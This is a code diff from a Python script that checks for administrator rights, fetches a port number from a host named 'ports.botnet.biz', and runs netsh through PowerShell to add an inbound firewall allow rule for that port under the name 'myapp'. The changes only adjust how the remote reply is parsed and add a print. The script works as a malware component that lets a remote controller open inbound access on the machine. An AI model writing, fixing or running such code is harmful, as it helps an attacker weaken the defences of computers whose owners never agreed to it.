@@ -141,7 +141,7 @@ def is_admin():
         return False
 
 def openFirewallPort():
-        port = getPort()
+        port = int(getPort()[0])
         p = subprocess.Popen(["powershell.exe", 
               "netsh advfirewall firewall add rule name=\"myapp\" dir=in action=allow protocol=TCP localport="+str(port)], 
               stdout=sys.stdout)
@@ -149,15 +149,17 @@ def openFirewallPort():
 
 def getPort():
     port = urllib.request.urlopen("http://ports.botnet.biz").read()
-    port = int(port)
+    port = port.decode('utf-8')
+    port = port.split(":")
 
     return port
 
 if is_admin():
 
         #get port from database
-        port = getPort()
+        port = int(getPort()[0])
 
+        print(port)
         #add firewall exception
         openFirewallPort()
 
